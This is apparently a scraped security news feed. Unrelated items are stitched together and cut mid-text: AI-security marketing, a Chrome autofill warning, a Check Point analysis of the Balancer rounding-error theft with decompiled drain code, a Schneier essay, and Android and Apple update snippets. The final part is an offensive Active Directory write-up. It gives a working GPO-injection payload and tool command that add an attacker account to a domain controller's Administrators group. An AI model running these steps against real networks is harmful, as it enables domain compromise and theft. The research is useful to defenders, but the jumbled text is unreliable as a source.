applications leverage generative and agentic AI. This is a critical component of protecting AI as an attack surface itself. – An AI-ready streaming data pipeline that intelligently filters, normalizes, and ingests petabytes of telemetry across the enterprise with sub-second latency and strong cost efficiency. Combined with Singularity AI SIEM, this provides both pre-ingestion analytics and flexible pull/stream data collection, ensuring complete visibility, real-time detections and autonomous response across the entire security environment.These advancements extend Singularity into a unified AI Security architecture that gives defenders a complete, autonomous view across traditional and emerging surfaces – from premise to cloud.Delivering on the AI Security Vision TodayToday at OneCon, we’re not just giving customers a roadmap and strategy, we’re giving them new tools and innovation to start securing their AI-enterprise today, including: – Real-time visibility and policy enforcement across thousands of AI tools.

We’re wherever the adversary moves, delivering real-time protection across dozens of surfaces and data sources. With AI infused into every layer of our operations, we’re moving faster, scaling further, and stopping even unknown threats with greater precision than ever before.New Infrastructure as Code (IaC) deployment processes, better observability across the platform, and proactive communications on incidents via a public status page have all been added to bolster resilience, reliability and transparency.Active monitoring mode and proactive alerting extends resilience outside the SaaS operation into the Endpoint agent, providing near real-time health metrics of the agents themselves – now transparently available for the customer visibility in the agent management control plane.The Path Forward in AI Security: Advancing Humanity, Protecting the HumanAI security is more than just defending systems, it’s about defending the fabric of trust that lets humans thrive in a digital world. As intelligence becomes ambient and autonomous, security must evolve from a reactive layer into an enabling force for human progress. – By offloading complexity and noise to intelligent machines, AI security frees humans to focus on creativity, empathy, and purpose. Protection becomes invisible, a silent force amplifying human capability rather than constraining it. – As data becomes identity, securing truth is a moral imperative. AI security safeguards the authenticity of information, ensuring societies can rely on what they see, share, and believe. As our lives move fully into digital spaces, the boundary between human and machine expression blurs. Every action carries traces of who we are. In this new reality, AI Security’s role is to safeguard that trust: To ensure that what we see, share, and decide upon is authentic. It means protecting the fidelity of data, the truth of identities, and the integrity of digital interactions against manipulation. It is the contract to our reality. – The next era demands systems that defend not only themselves, but the people they serve. Ethical AI security means designing intelligence that understands context, respects privacy, and acts in humanity’s best interest even when no one is watching.Ultimately, the path forward fuses human and artificial intelligence into a shared defense, machines protecting people, and people guiding machines, so that technology remains our most trusted ally, not our greatest risk.Defenders deserve a technology that protects every surface, that can see everything, turns data into advantage, and puts human governance at the center. So, let’s get started.AI for Security. Security for AI. Autonomous protection, always evolving, in production, today, all in pursuit of a safer, brighter future.]]></content:encoded></item><item><title>AI Security Realized: Innovation Highlights from OneCon25</title><link>https://www.sentinelone.com/blog/ai-security-realized-innovation-highlights-from-onecon25/</link><author>SentinelOne</author><category>threatintel</category><enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/11/OneCon25_Blog_1200x627.png" length="" type=""/><pubDate>Wed, 5 Nov 2025 14:00:15 +0000</pubDate><source url="https://www.sentinelone.com/">SentinelOne Blog</source><content:encoded><![CDATA[Today, on the main stage at OneCon 2025, SentinelOne is taking the wraps off its vision, roadmap, and new portfolio for securing an AI-powered world.

The new “enhanced autofill” can now stash your driver’s license, passport details, VIN, or license plate information. Sounds convenient, right? But just because you can, it doesn’t mean you should.Let’s face it: filling out government forms or travel bookings online is a pain. Anything that saves a few minutes—or spares you from hunting down your passport at the back of a drawer—feels like a win, especially if Chrome can neatly autofill those fields. And yes, Google promises encryption, explicit permission for autofill, and manual activation only if you want it.But let’s think this through. Is storing your most personally identifiable information—like government-issued IDs—in the market-dominant browser a good idea? Because that’s what Chrome is.Chrome’s market share (over 73% at the time of writing) makes it the internet’s biggest bullseye for criminals. Whether you’re using the enhanced autofill or the regular one, browser-based storage schemes are relentlessly hunted by password stealers, infostealers, and other types of malware.And let’s not forget phishing attempts. Maybe having to dig through your drawer while you think about why a website needs that information isn’t such a bad thing after all.Sure, Chrome encrypts autofill data, only saves your info with permission, and asks for confirmation before pasting it into a form. You can also ramp up security with two-factor authentication (2FA) and a Chrome sync passphrase. But when cybercriminals get the right kind of access (by stealing a browser session, finding an unlocked device, or getting you to install a rogue extension), your sensitive information is in danger. And with what Chrome can now store, that could mean your identity.Chrome’s enhanced autofill promises a smoother online ride, but the consequences of storing government IDs in your browser could outweigh the perks. Cybercriminals love a big target—and with Chrome’s popularity, the bounty only grows. When the reward for a criminal is your passport, driver’s license, or identity, convenience should come second to caution.Thankfully, someone decided it was a good idea to turn off this feature by default, but if you want to check, here’s how to find it:In the main Chrome menu, click on .Under , select  if present.Better alternative: password managersWe would advise that if you must store this kind of information digitally, use a password manager. These tools are built for secure storage—they’re audited for security, separate from browser processes, and don’t automatically serve up your data to any site that happens to have the right input fields.Stick to a dedicated password manager and stay in control of what’s stored and where it gets filled out. Remember: the less a browser knows about your life, the safer you are when someone eventually tries to break in.We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

On November 3, 2025, Check Point Research’s blockchain monitoring systems detected a sophisticated exploit targeting Balancer V2’s ComposableStablePool contracts. The attacker exploited arithmetic precision loss in pool invariant calculations to drain **$128.64 million** across six blockchain networks in under 30 minutes.

The attack leveraged a rounding error vulnerability in the \_upscaleArray function that, when combined with carefully crafted batchSwap operations, allowed the attacker to artificially suppress BPT (Balancer Pool Token) prices and extract value through repeated arbitrage cycles. The exploitation occurred primarily during attacker smart contract deployment, with the constructor executing 65+ micro-swaps that compounded precision loss to devastating effect.

In the early morning hours of November 3, 2025, Check Point’s Blockchain Threat Analysis system flagged unusual activity on the Ethereum mainnet involving Balancer’s V2 Vault contract. Within minutes, our automated detection identified a critical exploit in progress, with massive fund outflows from multiple liquidity pools.

The attack exploited a mathematical vulnerability in how Balancer’s ComposableStablePools handle small-value swaps. When token balances are pushed to specific rounding boundaries (8-9 wei range), Solidity’s integer division causes significant precision loss. The attacker weaponized this by executing batched swap sequences that accumulated these tiny errors into catastrophic invariant manipulation.

Balancer V2 uses a centralized “Vault” contract (0xBA12222222228d8Ba445958a75a0704d566BF2C8) that holds all tokens across all pools, separating token storage from pool logic to reduce gas costs and enable capital efficiency. This shared liquidity design meant a single vulnerability in pool math could affect all ComposableStablePools simultaneously—exactly what happened in this attack.

Balancer V2’s Internal Balance system allows users to deposit tokens once and use them across multiple operations without repeated ERC20 transfers:

```
mapping(address => mapping(IERC20 => uint256)) private _internalTokenBalance;
```

This system became critical to the attack. The exploit contract accumulated stolen funds in its internal balance during deployment, then withdrew them to the final recipient address in subsequent transactions.

ComposableStablePools use Curve’s StableSwap invariant formula to maintain price stability between similar assets. The invariant D represents total pool value, and BPT price is calculated as D divided by totalSupply. However, the scaling operations that prepare balances for invariant calculations introduce rounding errors.

```
function _upscaleArray(uint256[] memory amounts, uint256[] memory scalingFactors) private pure returns (uint256[] memory) { for (uint256 i = 0; i < amounts.length; i++) { amounts[i] = FixedPoint.mulDown(amounts[i], scalingFactors[i]); } return amounts; } // Simplified representation - actual implementation is more complex function _calculateInvariant(uint256[] memory balances) private pure returns (uint256) { uint256[] memory scaledBalances = _upscaleArray(balances, scalingFactors); uint256 invariant = computeStableInvariant(scaledBalances, amplificationParameter); return invariant; }
```

The mulDown function performs integer division that rounds down. When balances are small (8-9 wei range), this rounding creates significant relative errors—up to 10% precision loss per operation.

This precision error propagates to the invariant D calculation, causing abnormal reduction in the calculated value. Since BPT price equals D divided by total supply, the reduced D directly lowers BPT price, creating arbitrage opportunities for the attacker.

Individual swaps produce negligible precision loss, but within a single batchSwap transaction containing 65 operations, these losses compound dramatically. The lack of invariant change validation allowed the attacker to systematically suppress BPT price through accumulated precision errors, extracting millions in value per pool

The attacker executed a sophisticated three-stage swap sequence within single \`batchSwap\` transactions:

**Stage 1: Adjustment to Rounding Boundary**

Swap large amounts of BPT for underlying tokens to push one token’s balance to the critical 8-9 wei threshold where rounding errors are maximized.

**Stage 2: Trigger Precision Loss**

Execute small swaps involving the boundary-positioned token. The `_upscaleArray` function rounds down during scaling, causing the invariant D to be underestimated and BPT price to drop artificially.

**Stage 3: Extract Value**

Mint or purchase BPT at the suppressed price, then immediately redeem for underlying assets at full value. The price discrepancy represents pure profit.

**This three-phase cycle repeated 65 times within the same** **batchSwap** **transaction.** All stages occur atomically, preventing intervention and ensuring precision losses accumulate across the shared balance state, ultimately extracting millions from each targeted pool.

Having understood the vulnerability mechanism, let’s examine how the attacker automated this exploitation.

**Exploit Contract Architecture**

The attacker deployed contract \`0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d\` with a three-address operational structure:

– Exploiter 1: 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207 (deployer)

– Exploit Contract: 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d

– Exploiter 2: 0xAa760D53541d8390074c61DEFeaba314675b8e3f (recipient)

**Constructor-Based Attack**

Analysis of transaction 0x6ed07db… revealed the theft occurred during contract deployment. The constructor automatically executed the rounding error exploitation, targeting two Balancer pools simultaneously.

The constructor generated 65 token transfers to Balancer’s Protocol Fees Collector—these are swap fees collected during the manipulation, not the stolen funds themselves. The transfer amounts display the characteristic pattern of iterative precision exploitation, decreasing from 0.414 osETH down to 0.000000000000000003 osETH as the rounding errors compound to negligible values.

The stolen value appears in InternalBalanceChanged events, which record balance updates within the Vault’s internal accounting system. The exploit contract’s internal balance increased by:

Pool 1 (osETH/wETH-BPT): +4,623 WETH, +6,851 osETH

Pool 2 (wstETH-WETH-BPT): +1,963 WETH, +4,259 wstETH **Combined total: 6,586 WETH (4,623 + 1,963) + 6,851 osETH + 4,259 wstETH**

These internal balance increases represent the actual stolen funds. The `InternalBalanceChanged` events show that the exploit contract’s Vault-internal account was credited with the drained assets. While the underlying tokens physically remained in the Vault contract, the Vault’s accounting system now recognized the exploit contract as the owner of these balances, enabling later withdrawal.

After the constructor accumulated stolen funds, function 0x8a4f75d6 transferred them to Exploiter 2:

```
function 0x8a4f75d6(address[] calldata targetPools) public { require(msg.sender == _callTx); poolIndex = 0; while (poolIndex < targetPools.length) { poolId = targetPools[poolIndex].getPoolId(); (tokens[],) = vault.getPoolTokens(poolId); internalBals[] = vault.getInternalBalance(address(this), tokens); tokenIndex = 0; while (tokenIndex < tokens.length) { operations[tokenIndex] = UserBalanceOp({ kind: 1, asset: tokens[tokenIndex], amount: internalBals[tokenIndex], sender: address(this), recipient: 0xAa760D53541d8390074c61DEFeaba314675b8e3f }); tokenIndex++; } vault.manageUserBalance(operations); poolIndex++; } }
```

This function withdraws the contract’s own internal balance. The UserBalanceOp has sender equal to the exploit contract address because the contract legitimately owns the funds accumulated during constructor execution.

Transaction \`0xd155207…\` confirms this withdrawal transferred 6,586 WETH from the exploit contract’s internal balance to Exploiter 2 address.

**Stage 1 – Theft (Constructor Execution):**

TX: 0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742

Action: Deploy exploit contract

Method: Constructor executes batchSwap operations against two pools

Result: $63M drained via rounding error, stored in contract’s internal balance

Evidence: 65 fee transfers + InternalBalanceChanged events showing +6,586 WETH, +6,851 osETH, +4,259 wstETH

**Stage 2 – Extraction (Function Call):**

TX: 0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569

Action: Call function 0x8a4f75d6

Method: Withdraw internal balance to Exploiter 2

Result: Funds transferred to final recipient

Evidence: manageUserBalance with sender = exploit contract

The Balancer exploit demonstrates how mathematical vulnerabilities in DeFi protocols can be weaponized through automation and careful parameter tuning. The attacker’s success stemmed from recognizing that negligible rounding errors become exploitable when amplified through dozens of operations in atomic transactions.

Despite extensive audits, the vulnerability persisted because traditional testing focuses on individual operation correctness, not cumulative effects of adversarial batch operations. The industry must evolve toward continuous security validation, economic attack modeling, and adversarial testing that considers how tiny flaws compound into catastrophic exploits.]]></content:encoded></item><item><title>How an Attacker Drained $128M from Balancer Through Rounding Error Exploitation</title><link>https://research.checkpoint.com/2025/how-an-attacker-drained-128m-from-balancer-through-rounding-error-exploitation/</link><author>matthewsu</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 12:04:59 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[By: Dikla Barda, Roaman Zaikin & Oded Vanunu On November 3, 2025, Check Point Research’s blockchain monitoring systems detected a sophisticated exploit targeting Balancer V2’s ComposableStablePool contracts.

    return invariant;
}
The mulDown function performs integer division that rounds down. When balances are small (8-9 wei range), this rounding creates significant relative errors—up to 10% precision loss per operation.This precision error propagates to the invariant D calculation, causing abnormal reduction in the calculated value. Since BPT price equals D divided by total supply, the reduced D directly lowers BPT price, creating arbitrage opportunities for the attacker.Individual swaps produce negligible precision loss, but within a single batchSwap transaction containing 65 operations, these losses compound dramatically. The lack of invariant change validation allowed the attacker to systematically suppress BPT price through accumulated precision errors, extracting millions in value per poolThe attacker executed a sophisticated three-stage swap sequence within single `batchSwap` transactions:Stage 1: Adjustment to Rounding BoundarySwap large amounts of BPT for underlying tokens to push one token’s balance to the critical 8-9 wei threshold where rounding errors are maximized.Stage 2: Trigger Precision LossExecute small swaps involving the boundary-positioned token. The  function rounds down during scaling, causing the invariant D to be underestimated and BPT price to drop artificially.Mint or purchase BPT at the suppressed price, then immediately redeem for underlying assets at full value. The price discrepancy represents pure profit.This three-phase cycle repeated 65 times within the same  All stages occur atomically, preventing intervention and ensuring precision losses accumulate across the shared balance state, ultimately extracting millions from each targeted pool.Having understood the vulnerability mechanism, let’s examine how the attacker automated this exploitation.Exploit Contract ArchitectureThe attacker deployed contract `0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d` with a three-address operational structure:– Exploiter 1: 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207 (deployer)– Exploit Contract: 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d– Exploiter 2: 0xAa760D53541d8390074c61DEFeaba314675b8e3f (recipient)Analysis of transaction 0x6ed07db… revealed the theft occurred during contract deployment. The constructor automatically executed the rounding error exploitation, targeting two Balancer pools simultaneously. The constructor generated 65 token transfers to Balancer’s Protocol Fees Collector—these are swap fees collected during the manipulation, not the stolen funds themselves. The transfer amounts display the characteristic pattern of iterative precision exploitation, decreasing from 0.414 osETH down to 0.000000000000000003 osETH as the rounding errors compound to negligible values.The stolen value appears in InternalBalanceChanged events, which record balance updates within the Vault’s internal accounting system. The exploit contract’s internal balance increased by:Pool 1 (osETH/wETH-BPT): +4,623 WETH, +6,851 osETHPool 2 (wstETH-WETH-BPT): +1,963 WETH, +4,259 wstETHCombined total: 6,586 WETH (4,623 + 1,963) + 6,851 osETH + 4,259 wstETHThese internal balance increases represent the actual stolen funds. The  events show that the exploit contract’s Vault-internal account was credited with the drained assets. While the underlying tokens physically remained in the Vault contract, the Vault’s accounting system now recognized the exploit contract as the owner of these balances, enabling later withdrawal.After the constructor accumulated stolen funds, function 0x8a4f75d6 transferred them to Exploiter 2:function 0x8a4f75d6(address[] calldata targetPools) public {
    require(msg.sender == _callTx);
    
    poolIndex = 0;
    while (poolIndex < targetPools.length) {
        poolId = targetPools[poolIndex].getPoolId();
        (tokens[],) = vault.getPoolTokens(poolId);
        internalBals[] = vault.getInternalBalance(address(this), tokens);
        
        tokenIndex = 0;
        while (tokenIndex < tokens.length) {
            operations[tokenIndex] = UserBalanceOp({
                kind: 1,
                asset: tokens[tokenIndex],
                amount: internalBals[tokenIndex],
                sender: address(this),
                recipient: 0xAa760D53541d8390074c61DEFeaba314675b8e3f
            });
            tokenIndex++;
        }
        
        vault.manageUserBalance(operations);
        poolIndex++;
    }
}
This function withdraws the contract’s own internal balance. The UserBalanceOp has sender equal to the exploit contract address because the contract legitimately owns the funds accumulated during constructor execution.Transaction `0xd155207…` confirms this withdrawal transferred 6,586 WETH from the exploit contract’s internal balance to Exploiter 2 address.Stage 1 – Theft (Constructor Execution):TX: 0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742Action: Deploy exploit contractMethod: Constructor executes batchSwap operations against two poolsResult: $63M drained via rounding error, stored in contract’s internal balanceEvidence: 65 fee transfers + InternalBalanceChanged events showing +6,586 WETH, +6,851 osETH, +4,259 wstETHStage 2 – Extraction (Function Call):TX: 0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569Action: Call function 0x8a4f75d6Method: Withdraw internal balance to Exploiter 2Result: Funds transferred to final recipientEvidence: manageUserBalance with sender = exploit contractThe Balancer exploit demonstrates how mathematical vulnerabilities in DeFi protocols can be weaponized through automation and careful parameter tuning. The attacker’s success stemmed from recognizing that negligible rounding errors become exploitable when amplified through dozens of operations in atomic transactions.Despite extensive audits, the vulnerability persisted because traditional testing focuses on individual operation correctness, not cumulative effects of adversarial batch operations. The industry must evolve toward continuous security validation, economic attack modeling, and adversarial testing that considers how tiny flaws compound into catastrophic exploits.]]></content:encoded></item><item><title>Scientists Need a Positive Vision for AI</title><link>https://www.schneier.com/blog/archives/2025/11/scientists-need-a-positive-vision-for-ai.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Wed, 5 Nov 2025 12:04:34 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[For many in the research community, it’s gotten harder to be optimistic about the impacts of artificial intelligence.As authoritarianism is rising around the world, AI-generated “slop” is overwhelming legitimate media, while AI-generated deepfakes are spreading misinformation and parroting extremist messages. AI is making warfare more precise and deadly amidst intransigent conflicts. AI companies are exploiting people in the global South who work as data labelers, and profiting from content creators worldwide by using their work without license or compensation. The industry is also affecting an already-roiling climate with its enormous energy demands.Meanwhile, particularly in the United States, public investment in science seems to be redirected and concentrated on AI at the expense of other disciplines. And Big Tech companies are consolidating their control over the AI ecosystem. In these ways and others, AI seems to be making everything worse.This is not the whole story. We should not resign ourselves to AI being harmful to humanity. None of us should accept this as inevitable, especially those in a position to influence science, government, and society. Scientists and engineers can push AI towards a beneficial path. Here’s how.A Pew study in April found that 56 percent of AI experts (authors and presenters of AI-related conference papers) predict that AI will have positive effects on society. But that optimism doesn’t extend to the scientific community at large. A 2023 survey of 232 scientists by the Center for Science, Technology and Environmental Policy Studies at Arizona State University found more concern than excitement about the use of generative AI in daily life—by nearly a three to one ratio.We have encountered this sentiment repeatedly. Our careers of diverse applied work have brought us in contact with many research communities: privacy, cybersecurity, physical sciences, drug discovery, public health, public interest technology, and democratic innovation. In all of these fields, we’ve found strong negative sentiment about the impacts of AI. The feeling is so palpable that we’ve often been asked to represent the voice of the AI optimist, even though we spend most of our time writing about the need to reform the structures of AI development.We understand why these audiences see AI as a destructive force, but this negativity engenders a different concern: that those with the potential to guide the development of AI and steer its influence on society will view it as a lost cause and sit out that process.Elements of a Positive Vision for AIManyhavearguedthatturning the tide of climate action requires clearly articulating a path towards positive outcomes. In the same way, while scientists and technologists should anticipate, warn against, and help mitigate the potential harms of AI, they should also highlight the ways the technology can be harnessed for good, galvanizing public action towards those ends.There are myriad ways to leverage and reshape AI to improve peoples’ lives, distribute rather than concentrate power, and even strengthen democratic processes. Many examples have arisen from the scientific community and deserve to be celebrated.While each of these applications is nascent and surely imperfect, they all demonstrate that AI can be wielded to advance the public interest. Scientists should embrace, champion, and expand on such efforts.A Call to Action for ScientistsThese apply to scientists as well. Researchers should work to  the AI industry to be more ethical, equitable, and trustworthy. We must collectively developethicalnorms for research that advance and applies AI, and should use and draw attention to AI developers who adhere to those norms.Second, we should  harmful uses of AI by documenting the negative applications of AI and casting a light on inappropriate uses.Third, we should  AI to make society and peoples’ lives better, exploiting its capabilities to help the communities they serve.And finally, we must advocate for the  of institutions to prepare them for the impacts of AI; universities, professional societies, and democratic organizations are all vulnerable to disruption.Scientists have a special privilege and responsibility: We are close to the technology itself and therefore well positioned to influence its trajectory. We must work to create an AI-infused world that we want to live in. Technology, as the historian Melvin Kranzberg observed, “is neither good nor bad; nor is it neutral.” Whether the AI we build is detrimental or beneficial to society depends on the choices we make today. But we cannot create a positive future without a vision of what it looks like.This essay was written with Nathan E. Sanders, and originally appeared in IEEE Spectrum.]]></content:encoded></item><item><title>Securing the Open Android Ecosystem with Samsung Knox</title><link>https://thehackernews.com/2025/11/securing-open-android-ecosystem-with.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPd1GerA19wNhABt5LKN6GfthI5rzfkRTbigEYmdoa_xBlhczavPQemf3AG5HSmjAYK3cot1kYKQuceJ90bhNnju1ZD9y_AnwuU_4cPawlBGIJtjtlIO7WnP8PVo4K0UEVJMSayB31YGm0TpferX6BetOhEDyB3v-faGFJB3ehP2Li9g7PpoIEoMLfO5Y/s1600/samsung.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Raise your hand if you’ve heard the myth, “Android isn’t secure.”

Some of these bugs could let cybercriminals see your private data, take control of parts of your device, or break key security protections.Installing these updates as soon as possible keeps your personal information—and everything else on your Apple devices—safe from attack.Although Apple never releases full details before everyone has had a chance to apply the updates, two serious security flaws stand out:This vulnerability is a permission issue which is fixed in iOS 26.1 and iPadOS 26.1. It could allow an app to identify which other apps a user has installed. You can imagine that if a banking Trojan—like this one on Android—can see which banking apps and crypto wallets someone uses they can maximize their social engineering strategies to target that user. This is a privacy issue in watchOS 26.1, visionOS 26.1, iOS 26.1, and iPadOS 26.1. It allows malicious apps to capture screenshots of sensitive information in embedded views. Apple addressed this by tightening privacy checks and isolation policies.Updates for your particular deviceThis table shows which updates are available and points you to the relevant security content fot that operating system (OS).How to update your devicesHow to update your iPhone or iPadFor iOS and iPadOS users, here’s how to check if you’re using the latest software version:Go to  >  > .

Active Directory Sites are a feature allowing to optimize network performance and bandwidth usage in AD internal environments. They are commonly implemented by large, geographically dispersed organizations spanning accross multiple countries or continents.

Sites did not receive much attention by the Active Directory offensive research community, comparatively to other ACL-based attack vectors. This article aims to demonstrate that not only do attack vectors targeting Active Directory sites exist, but that they can lead to impactful privilege escalation scenarios and to domain(s) compromise.

We will describe a pull request that we submitted to the BloodHound project in order to enumerate Site ACL attack paths, and how to exploit those paths in an efficient way with the tools that we recently released, related to GPO-based exploit vectors. Said compromise scenarios may allow attackers to elevate their privileges, as well as move laterally within an Active Directory forest.

## Introduction

Sites are associated with the physical representation of an Active Directory environment, rather than with the identity side of it. As such, they may have been considered by the research community as less interesting from a security standpoint, and relegated to a situational, production-related / functional feature not offering real offensive opportunities.

While it is true that not all organizations rely on Active Directory sites for network distribution, this article aims to demonstrate that, when they exist, site-based ACL attack vectors can prove rather powerful and lead to the compromise of one or several domains. As a result, sites can be considered as critical infrastructure components, that are worth including in popular attack path visualisation tools such as BloodHound.

A documented, but lesser known exploitation technique relying on sites will also be described in this article. The exploitation of such a vector may allow an attacker to move laterally within a forest without being hindered by any SID filtering configuration. We will show how it can be concretely exploited, taking advantage of the recent GPO offensive tooling that we released a few months ago.

## 1\. Active Directory sites 101

This first section will clarify what exactly Active Directory sites are, and how they are concretely implemented in Active Directory. If you are familiar with these concepts, feel free to skip ahead.

As was briefly mentioned above, Active Directory sites are all about **network efficiency and bandwidth usage optimization**. Sites are objects to which highly connected **subnets** are assigned – all the objects that are in these subnets (the computers as well as the users connecting to these computers) are part of the site. A site associates the resources from the grouped subnets for two main purposes:

- **Replication**. In Active Directory, when a change is applied to a specific domain controller, other domain controllers (from the same domain for domain data, and across the forest for the schema and configuration partitions – see part 5 for more details) need to replicate it. There are two types of Active Directory replication: **intra-site** replication, and **inter-site** replication. Because the resources within a single site can communicate pretty fast, intra-site replication is performed by default rather regularly (every 5 minutes). As inter-site replication is more demanding network-wise, the bandwidth is compressed and Active Directory allows administrators to define the replication's settings through site links (180 minutes by default).
- **Authentication**. A site should be assigned one or several **servers**, which are nothing more than domain controllers responsible for the site. Objects that are part of the site will prioritize the domain controllers that are configured as servers for the site.

By default, there exists only one site in a forest (named **Default-First-Site-Name**). Until another site is created, all objects are automatically assigned to this site and all replication is performed intra-site. If an administrator wishes to add another site, it must be configured and a **site link** must be assigned to it. A site link allows replication to take place between two sites, and defines the settings of the replication (for instance, the replication schedule). By default, site links are transitive, meaning that if site A is linked to site B, and site A is linked to site C, then site B is transitively linked to site C. This is performed via a **site bridge**, which is created automatically if the transitive attribute of site links was not explicitly disabled by an administrator.

Note that it is entirely possible to have orphaned sites that, due to a misconfiguration, are not linked with one another. This may obviously cause some serious issues in the environment, as the replication process will not take place, leading to discrepancies between domain controllers’ data.

Finally, it is important to mention that Active Directory sites are not in any way associated with domains repartition. A site may contain clients and domain controllers from various, distinct domains of the forest. This is why Active Directory domains handle the logical segmentation of the internal network resources, whereas sites constitute the **physical**, geographical representation of the environment.

More concretely, **Sites, subnets, and site links** are all LDAP objects located in the **configuration naming context** that is replicated forest-wide – in the `CN=Sites,CN=Configuration,DC=corp,DC=com` container (more details on this in part 5).

Managing sites can be performed from the **Sites and Services** Active Directory GUI.

## 2\. Why care?

Now that the concepts behind Active Directory sites are a bit clearer, why should we, from an offensive standpoint, care about it? Especially if sites are only used to group objects for network efficiency purposes?

As it turns out, it is possible to **assign Group Policy Objects**(GPOs) to Active Directory sites. The site objects have a gPLink attribute, describing the GPOs that **all the objects associated with the site** will apply. This makes sense, as some location-specific configurations may need to be applied by sites (firewall rules, browser favourites, visual identity, etc.). But this also makes for **interesting GPO-based attack vector opportunities**.

Indeed, if an attacker was somehow able to link a malicious GPO to a site, or to poison a GPO already linked to it, they could compromise **all the objects of the site**, including **the domain controllers** that are acting as site servers.

Several ACL-based attack paths may enable such a scenario, which is why Active Directory site ACLs should be considered interesting – or even critical when enumerating Active Directory environments.

## 3\. Sites enumeration: integrating Active Directory sites into BloodHound

We observed that, consistent with the low popularity of sites in Active Directory offensive research, no tool seems to currently collect and enumerate site ACLs in order to highlight potential high-impact attack paths. More specifically, the BloodHound go-to tool for Active Directory attack paths enumeration and visualisation does not yet include this kind of data.

Although dangerous ACLs affecting sites may not be as frequent as other misconfigurations related to more common object types, it is important to catch them when they exist, due to the high potential impact they can have. Which is why we just submitted a pull request to SharpHound, the SharpHoundCommon library, as well as to the BloodHound project. These pull request implement the following features:

- Collect data about
   **sites**, site **servers**, and site **subnets** when enumerating data from the Active Directory environment.
- Represent site data in the BloodHound interface, by associating each site with the related server and subnet objects.

- Add sites to the default
   **high value targets**, as control over a site results in the potential compromise of all objects associated with the site, including at least one domain controller acting as the site server.
- Create control edges targeting site objects (
   **GenericAll**, **GenericWrite**, **WriteGPLink**), as these permissions are exploitable (more on that in the next part).
- Integrate
   **GPLink** edges from Group Policy Objects to sites, in order to enumerate when a GPO affects a site (making control over such a GPO all the more interesting).

The following screenshots represent a preview of the pull request. **Please note that this is only provided for information purposes. The actual implementation will of course depend on the** **pull request’s review performed by** **BloodHound’s team**. If the pull request goes through, both visual representation and implementation may vary.

## 4\. Exploiting sites « GPO-style » for privilege escalation and domain(s) compromise

Now that the enumeration part is covered, the next section will concretely describe the different exploitation scenarios that can affect site objects, and how to exploit them.

_a. Controlling a GPO linked to a site_

The first exploitation scenario is the most straightforward, and occurs when a user has any kind of write privileges over a Group Policy Object that is linked to a site. In that case, said user may inject a malicious configuration into the site-linked GPO, and compromise any (or all) object(s) associated with the site.

For the rest of this section, demonstrations will be performed with the following environment in mind. A corporation has an Active Directory forest, with the **corp.com** root domain. It has three sites: the default **Default-First-Site-Name** site (for the main offices of the organization in Paris), as well as the **NewYork** and **Sidney** sites for its regional offices.

Let us assume that an attacker compromised the **adove** user, which has control over the **Paris\_Servers\_Firewall\_Rules** GPO. This GPO is linked to the **Default-First-Site-Name** default site, which has one server, **AD01-DC** from the **corp.com** root domain.

This can be exploited by injecting a malicious configuration into the **Paris\_Servers\_Firewall\_Rules** GPO, and waiting for the **AD01-DC** domain controller to apply it in order to compromise the DC’s domain.

To do so, the GroupPolicyBackdoor.py tool that we recently released can be used. It provides a stable exploitation framework for GPO manipulation in python. The project’s wiki describes in details how the tool works, and provides command examples. In a nutshell, the configuration that one wishes to inject into the target GPO is described by an **ini** file. While various configurations are supported (see the `modules_templates` directory), we will inject a simple immediate Scheduled Task into the GPO, that adds our controlled **adove** user to the local administrators group. Note that we are also only targeting the **AD01-DC** domain controller by using a **Computer Name filter**, since we do not want all the computers in the site to execute our task. The following file `ImmediateTask_create.ini` is created:

```
[MODULECONFIG] name = Scheduled Tasks type = computer [MODULEOPTIONS] task_type = immediate program = cmd.exe arguments = /c "net localgroup Administrators corp.com\adove /add" [MODULEFILTERS] filters = [ { "operator": "AND", "type": "Computer Name", "value": "ad01-dc.corp.com" } ]
```

The described configuration can now simply be injected into the target GPO with the `gpo inject` command.

```
$ python3 gpb.py gpo inject -d 'corp.com' --dc ad01-dc.corp.com -u 'adove' -p 'Password1' -m ImmediateTask_create.ini -n "Paris_Servers_Firewall_Rules"GPB - INJECT command - 2025-10-30 15:04:24.346517 [#] Command execution setup [+] All modules validated [*] State folder is state_folders/2025_10_30_150424 [#] Generating XML payloads for modules [+] Successfully generated XML for all payloads [#] Writing modules XML to the Group Policy Template via SMB [*] Writing module Scheduled Tasks (computer) [#] Updating GPO extension names in the Group Policy Container via LDAP [+] 'gPCMachineExtensionNames' successfully updated [#] Increasing the GPO version via LDAP and SMB [+] Successfully increased LDAP GPO version [+] Successfully increased SMB GPO version [+] GPB INJECT command success
```

All that is left to do, is wait for the target domain controller to apply the malicious Scheduled Task, and add the **adove** user to the local Administrators group – meaning, the Domain Admins group of the **corp.com** domain. GPO refresh for domain controllers happens every 5 minutes, after which it is possible to verify that our user is indeed local administrator of the domain controller, by connecting to the administrative `C$` share.

```
